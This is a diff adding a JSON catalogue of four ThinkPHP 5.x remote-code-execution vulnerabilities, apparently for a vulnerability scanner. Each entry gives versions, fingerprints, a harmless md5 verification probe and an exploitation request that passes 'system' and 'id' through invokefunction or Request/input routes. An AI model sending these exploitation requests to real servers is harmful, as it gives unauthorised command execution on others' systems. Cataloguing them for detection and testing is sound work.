@@ -1,0 +1,145 @@
+{
+  "family": "thinkphp",
+  "product": "ThinkPHP",
+  "entries": [
+    {
+      "id": "thinkphp-5x-invokefunction-rce",
+      "path": "thinkphp_5_rce.json",
+      "family": "thinkphp",
+      "product": "ThinkPHP",
+      "cve": "N/A",
+      "severity": "critical",
+      "tags": [
+        "thinkphp",
+        "rce",
+        "n-day",
+        "php",
+        "framework"
+      ],
+      "versions": [
+        "5.0.x",
+        "5.1.x"
+      ],
+      "fingerprints": [
+        "/index.php?s=index/\\think\\app/invokefunction",
+        "ThinkPHP error stack or route-style index.php?s=..."
+      ],
+      "signals": [
+        "Public entry remains at index.php",
+        "Accessible route-style query parameter s="
+      ],
+      "verification_summary": [
+        "GET /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=thinkphp_probe -> match known md5 marker"
+      ],
+      "exploitation_summary": [
+        "GET /index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
+      ],
+      "aliases": [
+        "ThinkPHP 5 invokeFunction RCE",
+        "call_user_func_array chain"
+      ]
+    },
+    {
+      "id": "thinkphp-5.0.x-debug-route-rce",
+      "path": "thinkphp_5_0_x_debug_rce.json",
+      "family": "thinkphp",
+      "product": "ThinkPHP",
+      "cve": "N/A",
+      "severity": "high",
+      "tags": [
+        "thinkphp",
+        "debug",
+        "rce",
+        "n-day"
+      ],
+      "versions": [
+        "5.0.x"
+      ],
+      "fingerprints": [
+        "Debug traces or verbose exception output",
+        "Route dispatch leaks ThinkPHP class names"
+      ],
+      "signals": [
+        "APP_DEBUG-like behavior visible to unauthenticated users",
+        "Container or invocation classes exposed in stack traces"
+      ],
+      "verification_summary": [
+        "GET /index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=thinkphp_debug_probe -> match md5 marker"
+      ],
+      "exploitation_summary": [
+        "GET /index.php?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
+      ],
+      "aliases": [
+        "ThinkPHP 5.0.x debug invokeFunction chain"
+      ]
+    },
+    {
+      "id": "thinkphp-5.0.23-request-input-rce",
+      "path": "thinkphp_5_0_23_rce.json",
+      "family": "thinkphp",
+      "product": "ThinkPHP",
+      "cve": "N/A",
+      "severity": "critical",
+      "tags": [
+        "thinkphp",
+        "request-input",
+        "rce",
+        "php"
+      ],
+      "versions": [
+        "5.0.23"
+      ],
+      "fingerprints": [
+        "/index.php?s=index/\\think\\Request/input",
+        "Request/input gadget reachable through front controller"
+      ],
+      "signals": [
+        "Input filter chain controllable from query parameters",
+        "md5/var_dump harmless probes return transformed attacker input"
+      ],
+      "verification_summary": [
+        "GET /index.php?s=index/\\think\\Request/input&filter=md5&data=thinkphp523 -> match md5 value"
+      ],
+      "exploitation_summary": [
+        "GET /index.php?s=index/\\think\\Request/input&filter=system&data=id"
+      ],
+      "aliases": [
+        "ThinkPHP 5.0.23 request input RCE"
+      ]
+    },
+    {
+      "id": "thinkphp-5.1.x-request-input-rce",
+      "path": "thinkphp_5_1_x_rce.json",
+      "family": "thinkphp",
+      "product": "ThinkPHP",
+      "cve": "N/A",
+      "severity": "critical",
+      "tags": [
+        "thinkphp",
+        "request",
+        "rce",
+        "5.1.x"
+      ],
+      "versions": [
+        "5.1.x"
+      ],
+      "fingerprints": [
+        "/index.php?s=index/\\think\\request/input",
+        "Lowercase request namespace in route dispatch chain"
+      ],
+      "signals": [
+        "Query-string controlled filter parameter affects output",
+        "ThinkPHP 5.1.x route/controller structure visible in errors or JS paths"
+      ],
+      "verification_summary": [
+        "GET /index.php?s=index/\\think\\request/input&filter=md5&data=thinkphp51 -> match md5 value"
+      ],
+      "exploitation_summary": [
+        "GET /index.php?s=index/\\think\\request/input&filter=system&data=id"
+      ],
+      "aliases": [
+        "ThinkPHP 5.1.x request input RCE"
+      ]
+    }
+  ]
+}
